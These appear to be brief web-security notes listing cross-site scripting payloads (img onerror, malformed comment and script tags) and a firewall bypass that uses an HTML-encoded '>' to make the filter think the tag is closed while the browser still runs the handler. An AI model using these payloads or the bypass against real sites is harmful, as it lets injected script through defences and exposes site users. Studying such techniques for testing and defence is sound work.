# example payloads

```
<img src="/" =_=" title="onerror='prompt(origin)'">
<--` <img/src=` onerror=alert(origin)> --!> // to assuem it's a comment
<!\script>confirm(origin)</script>
```

# html encoding to bypass the WAF

- `<img src onerror=alert(1)>` // 403
  `<img src>` // 200
  `<img src> onerror=alert(1)` // 200
  so we infer it's the problem with stuff being inside the angle bracket.

- `<img src &#x3E onerror=alert(1)>` // 200
  client --> WAF --> html decode --> rule set

  so WAF first html decode stuff, figures out the tag is closed, so it will return 200.
  but on the browser it doesn't matter what the string is just a random meaningless
  string, --> `onerror` will be triggered.

